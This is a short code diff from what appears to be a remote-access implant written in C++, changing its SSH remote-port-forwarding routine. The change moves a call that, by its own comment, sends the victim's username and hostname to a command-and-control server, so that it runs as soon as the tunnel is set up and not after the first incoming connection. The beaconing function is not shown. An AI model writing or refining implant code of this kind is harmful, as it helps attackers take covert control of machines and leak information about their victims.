@@ -305,6 +305,11 @@ void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_
     debug("Check port %d in remote server\n", binded_port ? binded_port :remote_liste_port);
     debug("[OTCP] Waiting for incoming connection...\n");
 
+    // Send victims username and hostname to the C2
+    if (leak_victims_info(sess, binded_port) != SSH_OK) {
+        debug("Error leaking victim's info\n");
+    }
+
 	ssh_channel chan;
     while (!should_terminate) {
         int dport = 0;	// The port bound on the server, here: 8080
@@ -335,11 +340,6 @@ void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_
             }
         }
         debug("\n[OTCP] Connection received\n");
-        
-        // Send victims username and hostname to the C2
-        if (leak_victims_info(sess, binded_port) != SSH_OK) {
-            debug("Error leaking victim's info\n");
-        }
 
         std::thread* t = new std::thread(SSHClient::remote_forwading_thread, sess, chan, lport, mutex, &thread_vector);
         pthread_mutex_lock(mutex);
